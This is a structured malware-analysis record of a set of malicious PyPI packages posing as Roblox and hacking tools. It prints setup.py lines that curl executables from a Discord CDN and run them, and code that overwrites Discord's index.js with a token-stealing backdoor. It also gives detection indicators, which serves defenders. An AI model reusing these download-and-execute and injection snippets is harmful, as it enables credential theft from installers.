package_info.package_name: cyphers (representative of the set: cyphers, rbxtool, rbxotools, rblxtools, pippytests, pippytest, testpipperz, testpipper, plutos, stealthpy, hackerfilelol, hackerfileloll)
package_info.package_versions: All versions released August 1, 2022 (or July 31, 2022 for stealthpy, hackerfilelol, hackerfileloll)
package_info.why_malicious: These packages masquerade as Roblox tools, thread management, or hacking modules but contain no legitimate functionality. Instead, they install password-stealing malware that exfiltrates sensitive data from browsers, Discord, and Roblox, and injects persistent backdoors into the Discord client.

malicious_snippets.code_snippet:
os.system('curl -o ZYXMN.exe https://cdn.discordapp.com/attachments/.../ZYXMN.exe && ZYXMN.exe')
os.system('curl -o ZYRBX.exe https://cdn.discordapp.com/attachments/.../ZYRBX.exe && ZYRBX.exe')
malicious_snippets.code_behavior: During installation, the code downloads two executables (ZYXMN.exe and ZYRBX.exe) from a Discord CDN and executes them, enabling the deployment of info-stealing malware.

malice_analysis.why_suspicious: setup.py should only handle package installation, not download and execute remote binaries.
malice_analysis.violated_expectations: Normal setup.py scripts do not fetch or run external executables.
malice_analysis.similar_legitimate_use: Automated installers for legitimate dependencies (rare, and should be explicit and auditable).
key_indicators: Remote binary download from Discord CDN

malicious_snippets.code_snippet: Steals browser data by decrypting local database master keys and exfiltrates passwords, cookies, credit cards, and history via Discord webhook.
malicious_snippets.code_behavior: After installation, the binary accesses browser storage, decrypts master keys, collects sensitive data, and sends it to a Discord webhook.

malice_analysis.why_suspicious: Accessing and exfiltrating browser-stored credentials is a hallmark of info-stealing malware.
malice_analysis.violated_expectations: No legitimate package should access or transmit browser secrets.
malice_analysis.similar_legitimate_use: Enterprise password managers (with explicit user consent and secure channels).
key_indicators: Automated data exfiltration to Discord webhook

malicious_snippets.code_snippet: Steals Roblox account cookie, user ID, Robux balance, and Premium status, then exfiltrates to Discord webhook.
malicious_snippets.code_behavior: After installation, the binary locates Roblox credentials and account data, then sends it to a Discord webhook.

malice_analysis.why_suspicious: Harvesting and exfiltrating Roblox credentials is malicious.
malice_analysis.violated_expectations: No legitimate tool should access or transmit Roblox account secrets.
malice_analysis.similar_legitimate_use: Roblox account management tools (with explicit user consent and secure APIs).

execution_context.trigger: runtime (when Discord client is present and restarted)
execution_context.file_location: index.js under discord_desktop_core folder (Discord client modification)

malicious_snippets.code_snippet:
with open((self.get_core(dir)[0] + '\\index.js'), 'w', encoding='utf-8') as f:
    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]))
malicious_snippets.code_behavior: At runtime, the code overwrites the Discord client's index.js file with a malicious JavaScript payload, injecting a backdoor that steals Discord authentication tokens, billing info, and credit cards.

malice_analysis.why_suspicious: Modifying application files to inject persistent backdoors is a classic malware technique.
malice_analysis.violated_expectations: No legitimate package should alter third-party application code, especially to inject credential-stealing scripts.
malice_analysis.similar_legitimate_use: Custom Discord client mods (should be opt-in, open source, and never exfiltrate data).

attack_chain.action: User installs the malicious PyPI package, triggering setup.py.
attack_chain.leads_to: Malware binaries are downloaded and executed.

attack_chain.action: Malware binaries (ZYXMN.exe, ZYRBX.exe) execute, harvesting browser, Discord, and Roblox credentials.
attack_chain.leads_to: Sensitive data is collected from the victim's system.

attack_chain.action: Malware modifies Discord client files to inject persistent JavaScript backdoor.
attack_chain.leads_to: Discord client becomes a persistent info-stealing backdoor.

attack_chain.action: Harvested data is exfiltrated to attacker-controlled Discord webhooks.
attack_chain.leads_to: Attacker receives stolen credentials and sensitive information.

behavioral_signatures: setup.py scripts that download and execute remote binaries
Unexpected modification of Discord client files (index.js in discord_desktop_core)
Network connections to Discord CDN and Discord webhooks during or after installation
Access to browser credential stores and decryption of master keys
file_indicators: Presence of ZYXMN.exe, ZYRBX.exe, or Main.exe in user directories
Modified index.js under Discord's discord_desktop_core folder
setup.py containing os.system or subprocess calls to download executables
network_indicators: Outbound HTTP POSTs to Discord webhooks (discord.com/api/webhooks/...)
detection_knowledge.how_to_detect: Monitor for setup.py scripts that invoke network downloads or execute binaries. Detect unauthorized changes to Discord client files, especially index.js. Flag outbound connections to Discord CDN and Discord webhooks from non-Discord processes. Alert on access to browser credential stores by unknown executables.
